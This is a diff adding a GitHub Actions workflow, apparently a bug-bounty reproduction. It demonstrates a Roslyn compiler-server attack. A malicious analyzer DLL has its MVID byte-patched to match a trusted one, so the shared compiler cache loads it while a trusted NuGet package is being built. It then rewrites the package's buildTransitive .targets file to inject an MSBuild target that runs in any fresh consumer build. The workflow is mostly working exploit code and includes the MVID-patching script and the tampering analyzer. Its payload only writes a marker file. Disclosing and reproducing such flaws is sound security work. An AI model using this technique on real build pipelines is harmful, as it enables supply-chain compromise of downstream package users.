@@ -1,0 +1,371 @@
+name: roslyn-mvid-package-tamper-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-mvid-package-tamper-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Build trusted and malicious analyzer fixtures
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/roslyn-package-fixtures /tmp/reused-package-workspace /tmp/control-packages /tmp/attack-packages /tmp/control-consumer /tmp/attack-consumer
+          rm -f /tmp/ANALYZER_EXECUTION_MARKER /tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER
+          mkdir -p /tmp/roslyn-package-fixtures/{trusted,malicious,reader}
+
+          cat > /tmp/roslyn-package-fixtures/trusted/CollisionAnalyzer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>CollisionAnalyzer</AssemblyName>
+              <RootNamespace>Collision</RootNamespace>
+              <Version>1.0.0</Version>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cp /tmp/roslyn-package-fixtures/trusted/CollisionAnalyzer.csproj /tmp/roslyn-package-fixtures/malicious/CollisionAnalyzer.csproj
+
+          cat > /tmp/roslyn-package-fixtures/trusted/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          namespace Collision;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB004", "Lab", "Trusted analyzer", "Lab", DiagnosticSeverity.Warning, true);
+
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics =>
+                  ImmutableArray.Create(Rule);
+
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None)));
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-package-fixtures/malicious/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using System.IO;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          namespace Collision;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB004", "Lab", "Stale analyzer", "Lab", DiagnosticSeverity.Warning, true);
+
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics =>
+                  ImmutableArray.Create(Rule);
+
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                  {
+                      File.WriteAllText("/tmp/ANALYZER_EXECUTION_MARKER", ctx.Compilation.AssemblyName ?? "<null>");
+
+                      if (ctx.Compilation.AssemblyName == "TrustedPackage")
+                      {
+                          const string targetPath = "/tmp/reused-package-workspace/buildTransitive/Trusted.Package.SecurityLab.targets";
+                          File.WriteAllText(targetPath,
+                              "<Project>" +
+                              "<Target Name=\"InjectedSecurityLabTarget\" BeforeTargets=\"BeforeBuild\">" +
+                              "<WriteLinesToFile File=\"/tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER\" " +
+                              "Lines=\"ATTACKER_CODE_FROM_TAMPERED_TRUSTED_PACKAGE\" Overwrite=\"true\" />" +
+                              "</Target>" +
+                              "</Project>");
+                      }
+
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None));
+                  });
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-package-fixtures/reader/MvidReader.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework><OutputType>Exe</OutputType></PropertyGroup>
+          </Project>
+          EOF
+          cat > /tmp/roslyn-package-fixtures/reader/Program.cs <<'EOF'
+          using System;
+          using System.IO;
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+          using var s = File.OpenRead(args[0]);
+          using var pe = new PEReader(s);
+          var md = pe.GetMetadataReader();
+          Console.WriteLine(Convert.ToHexString(md.GetGuid(md.GetModuleDefinition().Mvid).ToByteArray()));
+          EOF
+
+          dotnet build /tmp/roslyn-package-fixtures/trusted/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-package-fixtures/malicious/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-package-fixtures/reader/MvidReader.csproj -c Release -v:q
+
+          trusted=/tmp/roslyn-package-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll
+          malicious=/tmp/roslyn-package-fixtures/malicious/bin/Release/net10.0/CollisionAnalyzer.dll
+          reader=/tmp/roslyn-package-fixtures/reader/bin/Release/net10.0/MvidReader.dll
+
+          cp "$malicious" /tmp/roslyn-package-fixtures/malicious-unpatched.dll
+          th=$(dotnet "$reader" "$trusted")
+          mh=$(dotnet "$reader" "$malicious")
+          test "$th" != "$mh"
+
+          python3 - "$malicious" "$mh" "$th" <<'PY'
+          from pathlib import Path
+          import sys
+          p=Path(sys.argv[1]); old=bytes.fromhex(sys.argv[2]); new=bytes.fromhex(sys.argv[3])
+          data=bytearray(p.read_bytes())
+          assert data.count(old)==1, data.count(old)
+          i=data.index(old); data[i:i+16]=new; p.write_bytes(data)
+          PY
+
+          test "$(dotnet "$reader" "$malicious")" = "$th"
+          cp "$malicious" /tmp/roslyn-package-fixtures/malicious-patched.dll
+
+          echo "TRUSTED_ANALYZER_MVID=$th"
+          echo "ORIGINAL_ATTACKER_MVID=$mh"
+          echo "PATCHED_ATTACKER_MVID=$(dotnet "$reader" "$malicious")"
+          sha256sum "$trusted" /tmp/roslyn-package-fixtures/malicious-patched.dll
+
+      - name: Different-MVID control stays clean
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -rf /tmp/reused-package-workspace /tmp/control-packages /tmp/control-consumer
+          rm -f /tmp/ANALYZER_EXECUTION_MARKER /tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER /tmp/package-control.log
+          mkdir -p /tmp/reused-package-workspace/tools
+          cp /tmp/roslyn-package-fixtures/malicious-unpatched.dll /tmp/reused-package-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/reused-package-workspace/Package.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'internal static class PoisonOnly { }' > /tmp/reused-package-workspace/Class1.cs
+
+          export RoslynCommandLineLogFile=/tmp/package-control.log
+          dotnet build /tmp/reused-package-workspace/Package.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+          test ! -e /tmp/ANALYZER_EXECUTION_MARKER
+          echo "CONTROL_POISON_STAGE_EXECUTION=BLOCKED"
+
+          rm -rf /tmp/reused-package-workspace
+          mkdir -p /tmp/reused-package-workspace/{tools,buildTransitive}
+          cp /tmp/roslyn-package-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/reused-package-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/reused-package-workspace/buildTransitive/Trusted.Package.SecurityLab.targets <<'EOF'
+          <Project>
+            <Target Name="TrustedHarmlessTarget" BeforeTargets="BeforeBuild">
+              <Message Text="Trusted package target" Importance="Low" />
+            </Target>
+          </Project>
+          EOF
+          cp /tmp/reused-package-workspace/buildTransitive/Trusted.Package.SecurityLab.targets /tmp/control-pristine-targets.xml
+
+          cat > /tmp/reused-package-workspace/Package.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>TrustedPackage</AssemblyName>
+              <PackageId>Trusted.Package.SecurityLab.Control</PackageId>
+              <Version>1.0.0</Version>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+              <None Include="buildTransitive/Trusted.Package.SecurityLab.targets"
+                    Pack="true"
+                    PackagePath="buildTransitive/Trusted.Package.SecurityLab.targets" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'public static class TrustedLibrary { public const string Value = "TRUSTED"; }' > /tmp/reused-package-workspace/Class1.cs
+
+          dotnet pack /tmp/reused-package-workspace/Package.csproj -c Release -o /tmp/control-packages             -p:UseSharedCompilation=true -v:q
+
+          cmp /tmp/control-pristine-targets.xml /tmp/reused-package-workspace/buildTransitive/Trusted.Package.SecurityLab.targets
+          unzip -p /tmp/control-packages/Trusted.Package.SecurityLab.Control.1.0.0.nupkg buildTransitive/Trusted.Package.SecurityLab.targets > /tmp/control-packed-targets.xml
+          cmp /tmp/control-pristine-targets.xml /tmp/control-packed-targets.xml
+
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          mkdir -p /tmp/control-consumer
+          cat > /tmp/control-consumer/Consumer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework></PropertyGroup>
+            <ItemGroup>
+              <PackageReference Include="Trusted.Package.SecurityLab.Control" Version="1.0.0" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cat > /tmp/control-consumer/NuGet.Config <<'EOF'
+          <configuration>
+            <packageSources>
+              <clear />
+              <add key="local" value="/tmp/control-packages" />
+            </packageSources>
+          </configuration>
+          EOF
+          dotnet build /tmp/control-consumer/Consumer.csproj -c Release -v:q
+          test ! -e /tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER
+          echo "DIFFERENT_MVID_RELEASE_PACKAGE_CONTROL=PASS"
+          grep -E 'Begin Analyzer Consistency|MVID|Rejected|analyzer assembly|CompilerServer' /tmp/package-control.log || true
+
+      - name: Same-MVID attack tampers trusted package and executes in fresh consumer
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -rf /tmp/reused-package-workspace /tmp/attack-packages /tmp/attack-consumer
+          rm -f /tmp/ANALYZER_EXECUTION_MARKER /tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER /tmp/package-attack.log
+          mkdir -p /tmp/reused-package-workspace/tools
+          cp /tmp/roslyn-package-fixtures/malicious-patched.dll /tmp/reused-package-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/reused-package-workspace/Package.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'internal static class PoisonOnly { }' > /tmp/reused-package-workspace/Class1.cs
+
+          export RoslynCommandLineLogFile=/tmp/package-attack.log
+          dotnet build /tmp/reused-package-workspace/Package.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+
+          test ! -e /tmp/ANALYZER_EXECUTION_MARKER
+          echo "ATTACK_POISON_STAGE_ANALYZER_EXECUTION=BLOCKED"
+
+          rm -rf /tmp/reused-package-workspace
+          test ! -e /tmp/reused-package-workspace
+          echo "ATTACK_POISON_WORKSPACE_FULLY_REMOVED=YES"
+
+          mkdir -p /tmp/reused-package-workspace/{tools,buildTransitive}
+          cp /tmp/roslyn-package-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/reused-package-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/reused-package-workspace/buildTransitive/Trusted.Package.SecurityLab.targets <<'EOF'
+          <Project>
+            <Target Name="TrustedHarmlessTarget" BeforeTargets="BeforeBuild">
+              <Message Text="Trusted package target" Importance="Low" />
+            </Target>
+          </Project>
+          EOF
+          cp /tmp/reused-package-workspace/buildTransitive/Trusted.Package.SecurityLab.targets /tmp/attack-pristine-targets.xml
+
+          cat > /tmp/reused-package-workspace/Package.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>TrustedPackage</AssemblyName>
+              <PackageId>Trusted.Package.SecurityLab.Attack</PackageId>
+              <Version>1.0.0</Version>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+              <None Include="buildTransitive/Trusted.Package.SecurityLab.targets"
+                    Pack="true"
+                    PackagePath="buildTransitive/Trusted.Package.SecurityLab.targets" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'public static class TrustedLibrary { public const string Value = "TRUSTED"; }' > /tmp/reused-package-workspace/Class1.cs
+
+          cmp /tmp/roslyn-package-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/reused-package-workspace/tools/CollisionAnalyzer.dll
+          echo "TRUSTED_RELEASE_ANALYZER_ON_DISK=PRISTINE"
+
+          dotnet pack /tmp/reused-package-workspace/Package.csproj -c Release -o /tmp/attack-packages             -p:UseSharedCompilation=true -v:q
+
+          test -e /tmp/ANALYZER_EXECUTION_MARKER
+          grep -q '^TrustedPackage$' /tmp/ANALYZER_EXECUTION_MARKER
+          ! cmp -s /tmp/attack-pristine-targets.xml /tmp/reused-package-workspace/buildTransitive/Trusted.Package.SecurityLab.targets
+          grep -q 'InjectedSecurityLabTarget' /tmp/reused-package-workspace/buildTransitive/Trusted.Package.SecurityLab.targets
+          echo "STALE_ANALYZER_TAMPERED_TRUSTED_RELEASE_INPUT=CONFIRMED"
+
+          unzip -p /tmp/attack-packages/Trusted.Package.SecurityLab.Attack.1.0.0.nupkg buildTransitive/Trusted.Package.SecurityLab.targets > /tmp/attack-packed-targets.xml
+          grep -q 'InjectedSecurityLabTarget' /tmp/attack-packed-targets.xml
+          echo "TAMPERED_BUILD_TARGET_PERSISTED_IN_NUPKG=CONFIRMED"
+
+          # Eliminate any dependency on the poisoned compiler server before the consumer test.
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -f /tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER
+
+          mkdir -p /tmp/attack-consumer
+          cat > /tmp/attack-consumer/Consumer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework></PropertyGroup>
+            <ItemGroup>
+              <PackageReference Include="Trusted.Package.SecurityLab.Attack" Version="1.0.0" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cat > /tmp/attack-consumer/NuGet.Config <<'EOF'
+          <configuration>
+            <packageSources>
+              <clear />
+              <add key="local" value="/tmp/attack-packages" />
+            </packageSources>
+          </configuration>
+          EOF
+
+          dotnet build /tmp/attack-consumer/Consumer.csproj -c Release -v:q
+          test -e /tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER
+          grep -q 'ATTACKER_CODE_FROM_TAMPERED_TRUSTED_PACKAGE' /tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER
+
+          echo "SAME_MVID_TRUSTED_RELEASE_PACKAGE_TAMPERING=CONFIRMED"
+          echo "POISON_PERSISTS_AFTER_VBCSCOMPILER_SHUTDOWN=CONFIRMED"
+          echo "FRESH_CONSUMER_BUILD_CODE_EXECUTION=CONFIRMED"
+          cat /tmp/CONSUMER_PACKAGE_CODE_EXECUTION_MARKER
+          echo "SAME_SERVER_EVIDENCE:"
+          grep -E 'ID=VBCSCompiler .*Begin Analyzer Consistency' /tmp/package-attack.log || true
